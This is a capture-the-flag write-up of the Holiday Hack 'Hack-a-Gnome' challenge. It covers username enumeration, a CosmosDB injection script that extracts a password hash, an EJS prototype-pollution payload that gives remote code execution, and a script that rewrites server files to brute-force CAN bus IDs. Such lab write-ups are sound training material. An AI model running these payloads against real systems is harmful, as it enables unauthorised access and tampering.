# Hack-a-Gnome

Difficulty: :material-star::material-star::material-star::material-star-outline::material-star-outline:

## Objective

!!! question "Task description"

    Davis in the Data Center is fighting a gnome army—join the hack-a-gnome fun.

??? quote "Chris Davis"

    Hi, my name is Chris.

    I like miniature war gaming and painting minis.

    I enjoy open source projects and amateur robotics.

    Hiking and kayaking are my favorite IRL activies.

    I love single player video games with great stoylines.

    Hey, I could really use another set of eyes on this gnome takeover situation.

    Their systems have multiple layers of protection now - database authentication, web application vulnerabilities, and more!

    But every system has weaknesses if you know where to look.

    If these gnomes freeze the whole neighborhood, forget about hiking or kayaking—everything will be one giant ice rink. And trust me, miniature war gaming is a lot less fun when your paint freezes solid.

    Ready to help me turn one of these rebellious bots against its own kind?

## Hints

??? tip "Hack-A-Gnome"

    Sometimes, client-side code can interfere with what you submit. Try proxying your requests through a tool like Burp Suite or OWASP ZAP. You might be able to trigger a revealing error message.

??? tip "Hack-A-Gnome"

    Once you determine the type of database the gnome control factory's login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack.

??? tip "Hack-A-Gnome"

    There might be a way to check if an attribute IS_DEFINED on a given entry. This could allow you to brute-force possible attribute names for the target user's entry, which stores their password hash. Depending on the hash type, it might already be cracked and available online where you could find an online cracking station to break it.

??? tip "Hack-A-Gnome"

    I actually helped design the software that controls the factory back when we used it to make toys. It's quite complex. After logging in, there is a front-end that proxies requests to two main components: a backend Statistics page, which uses a per-gnome container to render a template with your gnome's stats, and the UI, which connects to the camera feed and sends control signals to the factory, relaying them to your gnome (assuming the CAN bus controls are hooked up correctly). Be careful, the gnomes shutdown if you logout and also shutdown if they run out of their 2-hour battery life (which means you'd have to start all over again).

??? tip "Hack-A-Gnome"

    Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome's control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory's pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages.

??? tip "Hack-A-Gnome"

    Nice! Once you have command-line access to the gnome, you'll need to fix the signals in the `canbus_client.py` file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI.

## Solution

There are multiple stages we need to go through to solve this challenge.

### Login

We get a login prompt when going to the webpage.

![answer](../media/hack_a_gnome/hack_a_gnome_1)
/// caption
Login prompt.
///

#### Username Enumeration

The `Create Account` page allows us to enumerate usernames as it instantly provides feedback on whether a username is still available. We can query common English names:

```title="Enumerate usernames using ffuf"
ffuf -w ./malenames-usa-top1000.txt -u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=FUZZ -fs 18
HAROLD                  [Status: 200, Size: 19, Words: 1, Lines: 1]
BRUCE                   [Status: 200, Size: 19, Words: 1, Lines: 1]
```

We now know that two accounts exist with `HAROLD` and `BRUCE` as username.

#### SQL Injection

Putting a `"` in the username field on the `Create Account` page generates an error:

```
Error: An error occurred while checking username: Message: {"errors":[{"severity":"Error","location":{"start":44,"end":45},"code":"SC1012","message":"Syntax error, invalid string literal token '\"'."}]} ActivityId: 27cab604-4a72-4736-9d48-3ebaa577a5a4, Microsoft.Azure.Documents.Common/2.14.0
```

We learn that the backend appears to be using Azure DocumentDB/CosmosDB and that it is injectable.

We can leverage the [IS_DEFINED()](https://learn.microsoft.com/en-us/cosmos-db/query/is-defined) function of Microsoft CosmosDB to find the password hash of a user object in the database. CosmosDB queries frequently use `c` as document alias and have `id` as a key. We can test this as follows using `IS_DEFINED()`:

```
# Try 'id' as key
" OR IS_DEFINED(c.id) --

# Try 'digest' as key
" OR IS_DEFINED(c.digest) --
```

This returns `Username is taken` for both, which indicates it returned `TRUE` meaning the alias and keys exist. The `digest` will contain the password hash we are looking for.

Therefore, the backend query must look something like this:

```
SELECT IIF(COUNT(1) = 0, true, false) AS available
FROM c
WHERE c.username = "<username>"
```

!!! example "AI usage"

    ChatGPT was used to learn more about the SQL query potentially in use in the backend, what alias is typically used when querying values CosmosDB, and what key names could be used to save a password hash.

We can leverage scripting to brute-force our way to the password by using the function `STARTSWITH()` and testing different character sequences. This is similar to the trick used in the HHC 2024 challenge [Deactivate Frostbit Naughty-Nice List Publication](https://tominthebytes.github.io/SANS-HHC-2024/act_3/deactivate/?h=script#injection).

??? note "Python SQL injection script to find password hash"

    This script will try all characters until the `STARTSWITH()` functions returns `TRUE`. If `TRUE`, then it saves that character and looks for the next one in the sequence.

    ``` py linenums="1"
    import requests
    import string

    # Target endpoint (expects ?value=... or similar)
    base_url = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable"

    # Characters to iterate over
    characters = string.ascii_lowercase + string.digits

    def check_value(char, result):
        # Construct a benign query value for probing
        query_value = f"{result}{char}"
        url = f'{base_url}?username=" OR STARTSWITH(c.digest, "{query_value}") --'

        response = requests.get(url)
        data = response.json()

        # Expect a structure like: { "available": true }
        return data.get("available", False)

    def run_probe():
        result = ""
        position = 0

        while True:
            matched = None

            for char in characters:
                print(f"Testing position {position} with '{char}'")

                if not(check_value(char, result)):
                    matched = char
                    result = result + char
                    print(f"Match at position {position}: '{char}'")
                    break

            if matched is None:
                break

            position += 1

            # External stopping condition to avoid infinite loops
            if position > 64:
                break

        return "".join(result)

    if __name__ == "__main__":
        print("Starting boolean‑based probe...")
        output = run_probe()
        print("Result:", output)
    ```

!!! example "AI usage"

    ChatGPT was used to adapt the injection script used for last year's HHC.

??? success "Password"

    The Python script will return the MD5 hash `d0a9ba00f80cbc56584ef245ffc56b9e`. Using [crackstation.net](https://crackstation.net/) we can decode this to the password `oatmeal12`. We test this password with both usernames (`BRUCE` and `HAROLD`) and find that it's the password of `BRUCE`.

    ![answer](../media/hack_a_gnome/hack_a_gnome_2)
    /// caption
    Decoding password hash.
    ///

### Prototype Pollution

After login we see the following:

![answer](../media/hack_a_gnome/hack_a_gnome_3)
/// caption
Decoding password hash.
///

The `Gnome Statistics` window displays values for certain keys and the `Gnome Control Interface` window displays a robot in some sort of maze. We have movement controls but we get errors when we try to use them. We will need to fix this to move the robot around and get to the control panel in the upper left corner. We also have a button `Update Name` with which we can push changes to keys in the statistics object.

The hints tell us we need to find a vulnerability that we can exploit using [prototype polution](https://portswigger.net/web-security/prototype-pollution).

!!! example "AI usage"

    Gemini Pro 3 helped navigating this part of the challenge and provided helpful suggestions.

We will leverage the `Update Name` functionality to push values to the prototype JavaScript object. [This](https://github.com/mde/ejs/issues/451) GitHub issue inspired the subkey to pollute for RCE:

```js title="Prototype pollution"
{
  "action": "update",
  "key": "__proto__",
  "subkey": "outputFunctionName",
  "value": "x;return global.process.mainModule.require('child_process').execSync('ls').toString(); //"
}
```

??? success "Prototype pollution request"

    We send a request with this payload encoded in the URL as follows:

    ```
    %7B%0A%20%20%22action%22:%20%22update%22,%0A%20%20%22key%22:%20%22__proto__%22,%0A%20%20%22subkey%22:%20%22outputFunctionName%22,%0A%20%20%22value%22:%20%22x;return%20global.process.mainModule.require('child_process').execSync('ls').toString();%20//%22%0A%7D
    ```


    ![answer](../media/hack_a_gnome/hack_a_gnome_burp)
    /// caption
    Burp request.
    ///

    This returns the following when refreshing the statistics page, proving that the exploit works:

    ```
    README.md canbus_client.py node_modules package-lock.json package.json server.js views
    ```

    We can now execute code remotely.

### CAN Bus

The last step we need to execute is to fix the controls of the robot. Using the RCE exploit in the last step we can learn more about the files on the server:

??? note "README.md"

    This file displays the different CAN IDs in use and indicates that more signals related to controller the robot's movement still have to be implemented.

    ``` md title="README.md" linenums="1"
    # 🎄 GnomeBot CAN Bus Protocol - Top Secret Workshop Edition!

    Ho ho hold on there! Welcome to the inner workings of the GnomeBot's communication system. This marvelous contraption uses the **CAN (Controller Area Network)** bus to chatter away about its status and sometimes even listen to requests. It's like the reindeer telegraph, but with more wires and less sneezing. This document details the known signals whizzing around on the `gcan0` interface. Remember, all multi-byte values are sent **Big Endian** (Most Significant Byte first), just like how Santa lists the nicest kids first! ---

    ## 🎁 CAN Data Requests (Client -> GnomeBot )

    Sometimes, you need to poke the GnomeBot to get specific information _right now_. Send one of these messages, and the _should_ reply with the corresponding Status/Data message (see below).

    | CAN ID (Hex) | Constant Name             | Description                                         | Data Sent |
    | :----------- | :------------------------ | :-------------------------------------------------- | :-------- | --- |
    | `0x400`      | `requestBatteryVoltageID` | Asks for the current battery voltage reading.       | (Empty)   |
    | `0x470`      | `requestGPSFixID`         | Inquires about the current GPS fix status.          | (Empty)   |
    | `0x410`      | `requestMotorSpeedLeftID` | Requests the current speed of the left motor.       | (Empty)   |
    | `0x460`      | `requestSystemTempID`     | Asks for the GnomeBot's internal temperature.       | (Empty)   |
    | `0x4C0`      | `requestPayloadStatusID`  | Requests the current status of the payload/gripper. | (Empty)   | --- |

    ## ✨ CAN Status & Data Responses (GnomeBot -> Client)

    These messages are the GnomeBot telling the world (or at least the CAN bus) what's going on. Some are sent automatically like clockwork (Periodic), some only when asked (Response Only), and some do both!

    | CAN ID (Hex) | Constant Name                | Behavior            | Data Bytes | Data Type            | Description & Units/Meaning                                                                 |
    | :----------- | :--------------------------- | :------------------ | :--------- | :------------------- | :------------------------------------------------------------------------------------------ | --- |
    | `0x300`      | `statusBatteryVoltageID`     | Response Only       | 2          | `uint16`             | Battery voltage in **millivolts (mV)**. E.g., `0x30D4` = 12500mV = 12.5V.                   |
    | `0x310`      | `statusMotorSpeedLeftID`     | Periodic + Response | 2          | `int16`              | Left motor speed in **RPM**. Can be negative for reverse!                                   |
    | `0x311`      | `statusMotorSpeedRightID`    | Periodic            | 2          | `int16`              | Right motor speed in **RPM**.                                                               |
    | `0x320`      | `statusSonarDistanceFrontID` | Periodic            | 2          | `uint16`             | Front sonar distance reading in **centimeters (cm)**.                                       |
    | `0x321`      | `statusSonarDistanceRearID`  | Periodic            | 2          | `uint16`             | Rear sonar distance reading in **centimeters (cm)**.                                        |
    | `0x330`      | `statusIMUDataID`            | Periodic            | 2          | `byte[0]`, `byte[1]` | Byte 0: Simple sequence/second counter. Byte 1: Status flags (e.g., `0x01` = OK).           |
    | `0x340`      | `statusHeadlightID`          | Periodic            | 1          | `uint8`              | Headlight status: `0x00` = Off, `0x01` = On. Is it Rudolph's spare nose?                    |
    | `0x350`      | `statusWifiStatusID`         | Periodic            | 2          | `byte[0]`, `byte[1]` | Byte 0: WiFi Signal Strength (0-100%). Byte 1: Status (`0`=Disc, `1`=Conn).                 |
    | `0x351`      | `statusBluetoothStatusID`    | Periodic            | 2          | `byte[0]`, `byte[1]` | Byte 0: Number of paired devices. Byte 1: Status (`0`=Off, `1`=On, `2`=Paired).             |
    | `0x360`      | `statusSystemTempID`         | Periodic + Response | 1          | `int8`               | Internal system temperature in **degrees Celsius (°C)**. Keep it cool, like the North Pole! |
    | `0x370`      | `statusGPSFixID`             | Response Only       | 1          | `uint8`              | GPS Fix Status: `0` = No Fix, `1` = 2D Fix, `2` = 3D Fix.                                   |
    | `0x380`      | `statusWheelOdomLeftID`      | Periodic            | 4          | `uint32`             | Cumulative left wheel odometry ticks. Rollin' towards Christmas!                            |
    | `0x381`      | `statusWheelOdomRightID`     | Periodic            | 4          | `uint32`             | Cumulative right wheel odometry ticks.                                                      |
    | `0x390`      | `statusAmbientLightID`       | Periodic            | 2          | `uint16`             | Ambient light sensor reading in **Lux**. Brighter than Rudolph's nose?                      |
    | `0x391`      | `statusHumidityID`           | Periodic            | 1          | `uint8`              | Relative humidity percentage (%). Is it snowing?                                            |
    | `0x392`      | `statusPressureID`           | Periodic            | 4          | `uint32`             | Barometric pressure in **Pascals (Pa)**.                                                    |
    | `0x3A0`      | `statusCurrentDrawID`        | Periodic            | 2          | `int16`              | Main battery current draw in **milliamps (mA)**. How much juice does this thing use?!       |
    | `0x3B0`      | `statusEstopStatusID`        | Periodic            | 1          | `uint8`              | Emergency Stop Status: `0x00` = OK, `0x01` = PRESSED! (Hopefully not!)                      |
    | `0x3C0`      | `statusPayloadStatusID`      | Periodic + Response | 1          | `uint8` (Bitmap)     | Payload Status: Bit 0 (`0x01`): Gripper Open, Bit 1 (`0x02`): Sensor Active.                |
    | `0x3D0`      | `statusNavStatusID`          | Periodic            | 1          | `uint8`              | Navigation System Status: `0`=Idle, `1`=Navigating, `2`=Reached, `3`=Failed.                |
    | `0x3E0`      | `statusFanSpeedID`           | Periodic            | 1          | `uint8`              | Cooling fan speed percentage (%). Keeping the circuits frosty.                              |
    | `0x3FF`      | `statusHeartbeatID`          | Periodic            | 1          | `uint8`              | Heartbeat counter. Increments with each message. Lub-dub, lub-dub... is it alive?!          | --- |

    ## 🛠️ Movement Commands & Acknowledgments (Client <-> GnomeBot )

    `TODO: There are more signals related to controlling the GnomeBot's movement (Up/Down/Left/Right) and the acknowledgments sent back by the bot. These involve CAN IDs that are not totally settled yet. We are still polishing the documentation for these - check back after eggnog break!` ---

    ```

??? note "canbus_client.py"

    This file contains the logic to listen to the CAN bus and send commands. It contains the faulty commands to move the robot; these must be replaced with the correct IDs. There is also `listen` functionality to understand what is being sent over the CAN bus but it didn't provide us with relevant information.

    ``` python title="canbus_client.py" linenums="1"
    #!/usr/bin/python3
    import can
    import time
    import argparse
    import sys
    import datetime # To show timestamps for received messages

    # Define CAN IDs (I think these are wrong with newest update, we need to check the actual device documentation)
    COMMAND_MAP = {
        "up": 0x656,
        "down": 0x657,
        "left": 0x658,
        "right": 0x659,
        # Add other command IDs if needed
        }

    # Add 'listen' as a special command option
    COMMAND_CHOICES = list(COMMAND_MAP.keys()) + ["listen"]
    IFACE_NAME = "gcan0"

    def send_command(bus, command_id): """Sends a CAN message with the given command ID."""
        message = can.Message(
            arbitration_id=command_id,
            data=[], # No specific data needed for these simple commands
            is_extended_id=False
        )

        try:
            bus.send(message)
            print(f"Sent command: ID=0x{command_id:X}")

        except can.CanError as e:
            print(f"Error sending message: {e}")

    def listen_for_messages(bus): """Listens for CAN messages and prints them."""
        print(f"Listening for messages on {bus.channel_info}. Press Ctrl+C to stop.")

        try:
            # Iterate indefinitely over messages received on the bus
            for msg in bus:
                # Get current time for the timestamp
                timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3] # Milliseconds precision
                print(f"{timestamp} | Received: {msg}") # You could add logic here to filter or react to specific messages
                # if msg.arbitration_id == 0x100:
                    # print(" (Noise message)")

        except KeyboardInterrupt:
            print("\nStopping listener...")

        except Exception as e:
            print(f"\nAn error occurred during listening: {e}")

    def main():
        parser = argparse.ArgumentParser(description="Send CAN bus commands or listen for messages.")
        parser.add_argument(
            "command", choices=COMMAND_CHOICES,
            help=f"The command to send ({', '.join(COMMAND_MAP.keys())}) or 'listen' to monitor the bus." )
        args = parser.parse_args()

        try:
            # Initialize the CAN bus interface
            bus = can.interface.Bus(channel=IFACE_NAME, interface='socketcan', receive_own_messages=False)
            # Set receive_own_messages if needed
            print(f"Successfully connected to {IFACE_NAME}.")

        except OSError as e:
            print(f"Error connecting to CAN interface {IFACE_NAME}: {e}")
            print(f"Make sure the {IFACE_NAME} interface is up ('sudo ip link set up {IFACE_NAME}')")
            print("And that you have the necessary permissions.")
            sys.exit(1)

        except Exception as e:
            print(f"An unexpected error occurred during bus initialization: {e}")
            sys.exit(1)

        if args.command == "listen":
            listen_for_messages(bus)
        else:
            command_id = COMMAND_MAP.get(args.command)

        if command_id is None:
            # Should not happen due to choices constraint
            print(f"Invalid command for sending: {args.command}")

            bus.shutdown()
            sys.exit(1)
            send_command(bus, command_id)
            # Give a moment for the message to be potentially processed if listening elsewhere
            time.sleep(0.1)
            # Shutdown the bus connection cleanly
            bus.shutdown()
            print("CAN bus connection closed.")

    if __name__ == "__main__":
        main()
    ```

??? note "server.js"

    This file contains the logic used to drive the wegpage.

    !!! example "AI usage"

        Script was formatted by ChatGPT.

    ```js title="server.js" linenums="1"
    require("dotenv").config();
    const express = require("express");
    const dns = require("dns");
    const path = require("path");
    const { exec } = require("child_process");

    const app = express();

    // --- Environment Variables & Initial Setup ---
    const PARENTID = process.env.PARENTID;
    let allowedIps = null;

    if (PARENTID) {
    console.log(`PARENTID is set to: ${PARENTID}. Resolving...`);
    dns.lookup(PARENTID, { all: true }, (err, addresses) => {
        if (err) {
        console.error(
            `Failed to resolve PARENTID hostname "${PARENTID}": ${err.message}. Allowing all connections.`
        );
        } else if (addresses && addresses.length > 0) {
        allowedIps = addresses.map((addr) => addr.address).join(", ");
        console.log(
            `Resolved PARENTID "${PARENTID}" to IPs: ${allowedIps}. Only these IPs will be allowed.`
        );
        } else {
        console.warn(
            `PARENTID "${PARENTID}" resolved, but no IP addresses found. Allowing all connections.`
        );
        }
    });
    } else {
    console.log(
        "PARENTID environment variable not set. Allowing all connections."
    );
    }

    // Middleware
    app.use(express.json());
    app.use(express.urlencoded({ extended: true }));

    // --- IP Filtering Middleware ---
    app.use((req, res, next) => {
    if (allowedIps === null) return next();

    const clientIp = req.ip.split(":").pop();
    if (allowedIps.includes(clientIp)) {
        next();
    } else {
        console.warn(
        `Rejected connection from ${clientIp} (does not match PARENTID IPs: ${allowedIps})`
        );
        res
        .status(403)
        .send(
            "Forbidden: Access denied. " +
            `Rejected connection from ${clientIp} (does not match PARENTID IPs: ${allowedIps})`
        );
    }
    });

    // --- Serve Static Files ---
    app.use("/static", express.static(path.join(__dirname, "static")));
    app.set("view engine", "ejs");

    // --- Game Constants ---
    const gnomebotname = "GnomeBot" + Math.floor(Math.random() * 99999);
    const containerUsername = process.env.USERNAME || "Unknown";
    const processStartTime = Date.now();

    const gnomeBotObjectDetails = {
    settings: {
        name: gnomebotname,
        model_version: "2.3.8",
        firmware_version: "GNM-4.12.0",
    },
    };

    // Routes
    app.get("/home", (req, res) => {
    res.setHeader("Content-Type", "text/html");
    res.sendFile(path.join(__dirname, "views", "home.ejs"));
    });

    app.get("/control", (req, res) => {
    res.setHeader("Content-Type", "text/html");
    res.sendFile(path.join(__dirname, "views", "control.ejs"));
    });

    app.get("/stats", (req, res) => {
    console.log("Rendering stats view");

    const gnomeStats = [
        {
        name: "name",
        value: gnomeBotObjectDetails?.settings?.name || gnomebotname,
        },
        {
        name: "model_version",
        value: gnomeBotObjectDetails?.settings?.model_version || "Unknown",
        },
        {
        name: "description",
        value: "Holiday remote controlled gnome for your home.",
        },
        { name: "status", value: "active" },
        { name: "last_updated", value: new Date().toISOString() },new
        { name: "last_updated_by", value: containerUsername },
        { name: "last_accessed_by", value: containerUsername },
        {
        name: "battery_level",
        value:
            Math.max(
            0,
            100 -
                Math.floor(
                ((Date.now() - processStartTime) / (2 * 60 * 60 * 1000)) * 100
                )
            ) + "%",
        },
        {
        name: "uptime",
        value: Math.floor((Date.now() - processStartTime) / 1000) + " seconds",
        },
        {
        name: "cpu_temperature",
        value: (Math.random() * 30 + 40).toFixed(1) + "°C",
        },
        { name: "current_task", value: "Idle" },
        { name: "network_status", value: "Connected" },
        { name: "error_logs", value: "None" },
        { name: "gnome_mode", value: "Stealth" },
        {
        name: "firmware_version",
        value: gnomeBotObjectDetails?.settings?.firmware_version || "Unknown",
        },
        {
        name: "gnome_mood",
        value: ["Happy", "Grumpy", "Mischievous"][Math.floor(Math.random() * 3)],
        },
        { name: "light_sensor", value: Math.random() > 0.5 ? "Bright" : "Dim" },
        {
        name: "gnome_config_object",
        value: JSON.stringify(gnomeBotObjectDetails),
        },
    ];

    res.setHeader(
        "Cache-Control",
        "no-store, no-cache, must-revalidate, proxy-revalidate"
    );
    res.setHeader("Pragma", "no-cache");
    res.setHeader("Expires", "0");

    res.render("stats", { gnomeStats });
    });

    app.get("/ctrlsignals", (req, res) => {
    const requestPayload = JSON.parse(decodeURIComponent(req.query.message));

    res.setHeader(
        "Cache-Control",
        "no-store, no-cache, must-revalidate, proxy-revalidate"
    );
    res.setHeader("Pragma", "no-cache");
    res.setHeader("Expires", "0");

    if (!requestPayload || !requestPayload.action) {
        console.error("Invalid request payload");
        res.status(400).send("Invalid request payload");
        return;
    }

    switch (requestPayload.action) {
        case "move": {
        console.log(`Moving in direction: ${requestPayload.direction}`);
        res.header("Content-Type", "application/json");

        if (!requestPayload.direction) {
            res.send(
            JSON.stringify({
                type: "message",
                data: "error",
                message: "No direction specified",
            })
            );
            return;
        }

        const direction = requestPayload.direction;
        const command = `/usr/bin/python3 /app/canbus_client.py "${direction}"`;

        switch (direction) {
            case "left":
            case "right":
            case "up":
            case "down":
            console.log(`Executing command: ${command}`);
            exec(command, (error, stdout, stderr) => {
                if (error) {
                console.error(`Error executing command: ${error.message}`);
                return;
                }
                if (stderr) {
                console.error(`Command stderr: ${stderr}`);
                return;
                }
                console.log(`Command stdout: ${stdout}`);
            });

            res.send(
                JSON.stringify({
                type: "message",
                data: "success",
                message: `Moving ${direction}`,
                })
            );
            break;

            default:
            console.error("Unknown direction");
            res.send(
                JSON.stringify({
                type: "message",
                data: "error",
                message: "Unknown direction",
                })
            );
            return;
        }

        break;
        }

        case "update": {
        try {
            const { key, subkey, value } = requestPayload;
            gnomeBotObjectDetails[key][subkey] = value;

            res.header("Content-Type", "application/json");
            res.send(
            JSON.stringify({
                type: "message",
                data: "success",
                message: `Updated ${key}.${subkey} to ${value}`,
            })
            );
        } catch (error) {
            res.setHeader("Content-Type", "application/json");
            res.send(
            JSON.stringify({
                type: "message",
                data: "error",
                message: `Error updating settings: ${error.message}`,
            })
            );
        }
        break;
        }

        default:
        console.error("Unknown action");
        res.status(400).send("Unknown action");
        return;
    }
    });

    // Health check
    app.get("/healthz", (req, res) => {
    res.status(200).send("OK");
    });

    // --- Server Setup ---
    const PORT = process.env.PORT || 3000;

    app.listen(PORT, () => {
    console.log(`Server (HTTP only) running on port ${PORT}`);
    });
    ```

One way to find the correct CAN IDs to move the robot is by brute forcing all options. We can replace the IDs in `canbus_client.py` using `sed`:

```
sed -i \"s/0x656/0x700/g\" canbus_client_test.py
```

We generate a Python script that replaces the CAN ID of one of the movement actions using prototype pollution and attempts to move the robot to see if it returns success. It makes sure to copy the original version of the script first to limit breaking the webapp and make replacing the correct value easier.

!!! example "AI usage"

    Gemini Pro 3 was used to generate this script.

??? note "Python brute force script"

    ``` py linenums="1"
    #!/usr/bin/env python3
    import requests
    import urllib.parse

    # Base URL and headers
    BASE_URL = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals"
    HEADERS = {
        "Host": "hhc25-smartgnomehack-prod.holidayhackchallenge.com",
        "Cookie": "connect.sid=s%3Ar6TrKtH1WpRIbFfK2Ty8sVh9A9ivJs-h.d3CdBPNL%2F0HWxFlPph3R7LzzFV3qcKd22qBAGBJI%2B4Q",
        "Accept": "*/*"
    }

    # Command template with placeholder
    COMMAND_TEMPLATE = """{
    "action": "update",
    "key": "__proto__",
    "subkey": "outputFunctionName",
    "value": "x;return global.process.mainModule.require('child_process').execSync('sed -i \\"s/0x656/REPLACE_HEX/g\\" canbus_client.py').toString(); //"
    }"""

    COMMAND_COPY = """{
    "action": "update",
    "key": "__proto__",
    "subkey": "outputFunctionName",
    "value": "x;return global.process.mainModule.require('child_process').execSync('cp canbus_client_copy.py canbus_client.py').toString(); //"
    }"""

    COMMAND_SETUP = """{
    "action": "update",
    "key": "__proto__",
    "subkey": "outputFunctionName",
    "value": "x;return global.process.mainModule.require('child_process').execSync('cp canbus_client.py canbus_client_copy.py').toString(); //"
    }"""

    COMMAND_BACKUP = """{
    "action": "update",
    "key": "__proto__",
    "subkey": "outputFunctionName",
    "value": "x;return global.process.mainModule.require('child_process').execSync('cp canbus_client.py canbus_client_backup.py').toString(); //"
    }"""

    COMMAND_TRY = """{"action":"move","direction":"up"}"""

    # Setup
    encoded_command = urllib.parse.quote(COMMAND_SETUP)
    # Send the control signal
    resp = requests.get(f"{BASE_URL}?message={encoded_command}", headers=HEADERS)
    print(f"Copied python file, status: {resp.status_code}")
    watch_resp = requests.get("https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats", headers=HEADERS)

    encoded_command = urllib.parse.quote(COMMAND_BACKUP)
    # Send the control signal
    resp = requests.get(f"{BASE_URL}?message={encoded_command}", headers=HEADERS)
    print(f"Copied python file, status: {resp.status_code}")
    watch_resp = requests.get("https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats", headers=HEADERS)

    # Loop over hex values 0x000 to 0x999
    for n in range(0x100, 0x99A):
        # Copy python script for fresh version
        encoded_command = urllib.parse.quote(COMMAND_COPY)
        # Send the control signal
        resp = requests.get(f"{BASE_URL}?message={encoded_command}", headers=HEADERS)
        print(f"Copied python file, status: {resp.status_code}")
        watch_resp = requests.get("https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats", headers=HEADERS)

        # Change hex value for 'up'
        hexval = f"0x{n:03x}"
        command = COMMAND_TEMPLATE.replace("REPLACE_HEX", hexval)
        encoded_command = urllib.parse.quote(command)
        # Send the control signal
        resp = requests.get(f"{BASE_URL}?message={encoded_command}", headers=HEADERS)
        print(f"Sent {hexval}, status: {resp.status_code}")
        watch_resp = requests.get("https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats", headers=HEADERS)

        # Try 'up' command
        encoded_command = urllib.parse.quote(COMMAND_TRY)
        resp = requests.get(f"{BASE_URL}?message={encoded_command}", headers=HEADERS)
        print(f"Tried 'up' command, status: {resp.status_code}")
        watch_resp = requests.get("https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats", headers=HEADERS)
        print(f"Watching output, length: {len(watch_resp.text)}")
        print(resp)
    ```

??? success "CAN IDs"

    Using the script, we find the following CAN IDs for moving the robot:

    ```
    0x201
    0x202
    0x203
    0x204
    ```

### Maze

The final step involves moving the robot through the maze with boxes. We can push boxes forward to create a path.

??? success "Maze"

    We can create the following path to get to the control box and solve the challenge:

    ![answer](../media/hack_a_gnome/hack_a_gnome_done)
    /// caption
    Path through maze.
    ///

## Response

!!! quote "Chris Davis"

    Excellent work! You've successfully taken control of the gnome - look at that interface responding to our commands now.

    Time to turn this little rebel against its own manufacturing operation and shut them down for good!
